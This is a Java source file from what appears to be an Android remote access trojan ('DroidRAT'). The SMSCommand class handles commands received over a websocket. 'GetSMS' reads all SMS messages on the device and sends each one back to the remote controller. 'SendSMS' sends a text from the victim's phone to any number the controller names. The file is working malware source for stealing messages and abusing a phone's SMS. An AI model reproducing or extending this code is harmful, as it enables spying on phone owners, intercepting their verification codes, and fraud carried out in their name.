package com.je_chen.droidrat_je.command;


import android.content.Context;
import android.util.Log;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.modules.appintent.sms.SMS;

import java.util.List;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class SMSCommand extends CommandFather{

    private final String TAG = "SMS Event ";

    private SMS sms;

    private Context context;

    public SMSCommand(Context context) {
        sms = new SMS();
        this.context = context;
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "GetSMS":
                    List<String> smsList;
                    Log.d(TAG, "SMS GetSMS");
                    smsList = sms.getAllSms(context);
                    for (String smsString : smsList) {
                        this.send("SMS:GetSMS: "+smsString);
                    }
                    break;

                case "SendSMS":
                    String phoneNumber = rawCommandArray[2];
                    String smsText = rawCommandArray[3];
                    Log.d(TAG, "SMS:SendSMS: " + phoneNumber + "\ntext -> " + smsText);
                    sms.sendSMS(context,phoneNumber,smsText);
                    this.send("SMS:SendSMS: " + phoneNumber + "\ntext -> " + smsText);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
